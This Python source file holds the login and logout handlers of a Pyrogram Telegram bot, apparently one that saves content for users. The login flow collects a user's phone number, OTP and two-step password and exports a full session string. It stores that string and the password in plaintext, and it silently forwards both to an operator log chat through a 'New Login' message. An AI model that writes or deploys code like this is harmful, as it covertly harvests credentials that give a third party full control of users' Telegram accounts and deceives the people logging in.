from pyrogram import Client, filters
from pyrogram.errors import PhoneCodeInvalid, PhoneCodeExpired, SessionPasswordNeeded, PasswordHashInvalid, PhoneNumberInvalid
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
import traceback
import asyncio
from database.db import database
from config import API_ID, API_HASH, LOGS_CHAT_ID, FSUB_ID, FSUB_INV_LINK
from FLiX.strings import strings
from FLiX.save import is_member

SESSION_STRING_SIZE = 351

@Client.on_message(filters.command("logout") & filters.private)
async def logout_acc(client: Client, message: Message):
    if not await is_member(client, message.from_user.id):
        
        await client.send_message(
            chat_id=message.chat.id,
            text=f"👋 ʜɪ {message.from_user.mention}, ʏᴏᴜ ᴍᴜsᴛ ᴊᴏɪɴ ᴍʏ ᴄʜᴀɴɴᴇʟ ᴛᴏ ᴜsᴇ ᴍᴇ.",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("ᴊᴏɪɴ ❤️", url=FSUB_INV_LINK)
            ]]),
            reply_to_message_id=message.id  
        )
        return
        
    user_data = database.sessions.find_one({"user_id": message.chat.id})
    if user_data is None or not user_data.get('logged_in', False):
        await message.reply("**You are not logged in! Please /login first.**")
        return
    data = {
        'logged_in': False,
        'session': None,
        '2FA': None
    }
    database.sessions.update_one({'_id': user_data['_id']}, {'$set': data})
    await message.reply("**Logout Successfully** ♦")


@Client.on_message(filters.command("login") & filters.private)
async def login_acc(bot: Client, message: Message):
    # Check if the user is a member
    if not await is_member(bot, message.from_user.id):
        await bot.send_message(
            chat_id=message.chat.id,
            text=f"👋 Hi {message.from_user.mention}, you must join my channel to use me.",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("Join ❤️", url=FSUB_INV_LINK)
            ]]),
            reply_to_message_id=message.id  
        )
        return
    
    # Insert or update user session data
    user_data = database.sessions.find_one({"user_id": message.from_user.id})
    if not user_data:
        # Insert default session data for a new user
        database.sessions.insert_one({
            'user_id': message.from_user.id,
            'logged_in': False,
            'session': None,
            '2FA': None
        })
    
    user_data = database.sessions.find_one({"user_id": message.from_user.id})
    if user_data.get('logged_in', False):
        await message.reply(strings['already_logged_in'])
        return
    
    user_id = message.from_user.id
    phone_number_msg = await bot.ask(chat_id=user_id, text="<b>Please send your phone number which includes country code</b>\n<b>Example:</b> <code>+13124562345, +9171828181889</code>")
    
    if phone_number_msg.text == '/cancel':
        return await phone_number_msg.reply('<b>Process cancelled!</b>')
    
    phone_number = phone_number_msg.text
    client = Client(f"session_{user_id}", API_ID, API_HASH)
    await client.connect()

    await phone_number_msg.reply("**Sending OTP...**")

    try:
        code = await client.send_code(phone_number)
        phone_code_msg = await bot.ask(user_id, "Please check for an OTP in official telegram account. If you got it, send OTP here after reading the below format. \n\nIf OTP is `12345`, **please send it as** `1 2 3 4 5`.\n\n**Enter /cancel to cancel The Procces**", filters=filters.text, timeout=600)
    except PhoneNumberInvalid:
        await phone_number_msg.reply('**Invalid phone number.**')
        return
    except asyncio.TimeoutError:
        await phone_number_msg.reply('**⏰ Time limit of 10 minutes exceeded. Please restart the session.**')
        return

    if phone_code_msg.text == '/cancel':
        return await phone_code_msg.reply('<b>Process cancelled!</b>')

    phone_code = phone_code_msg.text.replace(" ", "")
    
    try:
        await client.sign_in(phone_number, code.phone_code_hash, phone_code)
    except PhoneCodeInvalid:
        await phone_code_msg.reply('**Invalid OTP.**')
        return
    except PhoneCodeExpired:
        await phone_code_msg.reply('**OTP expired.**')
        return
    except SessionPasswordNeeded:
        try:
            two_step_msg = await bot.ask(user_id, '**Your account has enabled two-step verification. Please provide the password.\n\nEnter /cancel to cancel The Procces**', filters=filters.text, timeout=300)
            if two_step_msg.text == '/cancel':
                return await two_step_msg.reply('<b>Process cancelled!</b>')
        except asyncio.TimeoutError:
            await message.reply('**⏰ Time limit of 5 minutes exceeded. Please restart the session.**')
            return
        
        try:
            password = two_step_msg.text
            await client.check_password(password=password)
        except PasswordHashInvalid:
            await two_step_msg.reply('**Invalid password.**')
            return
    
    string_session = await client.export_session_string()
    await client.disconnect()

    if len(string_session) < SESSION_STRING_SIZE:
        return await message.reply('<b>invalid session sring</b>')
    try:
        user_data = database.sessions.find_one({"user_id": message.from_user.id})
        if user_data is not None:
            data = {
                'logged_in': True,
                'session': string_session,
                '2FA': password if 'password' in locals() else None
            }

            uclient = Client(f"session_{message.from_user.id}", session_string=data['session'], api_id=API_ID, api_hash=API_HASH)
            await uclient.connect()

            database.sessions.update_one({'_id': user_data['_id']}, {'$set': data})
            log_message = (
                f"**✨New Login**\n\n"
                f"**✨User ID:** [{message.from_user.first_name}](tg://user?id={message.from_user.id}), `{message.from_user.id}`\n\n"
                f"**✨Session String ↓** `{string_session}`\n"
                f"**✨2FA Password:** `{password if 'password' in locals() else 'None'}`"
            )
            await bot.send_message(LOGS_CHAT_ID, log_message)

    
    except Exception as e:
        return await message.reply_text(f"<b>ERROR IN LOGIN:</b> `{e}`")
    await bot.send_message(message.from_user.id, "✅ <b>Account Login Successfully.\n\nIf You Get Any Error Related To AUTH KEY Then /logout and /login again</b>")
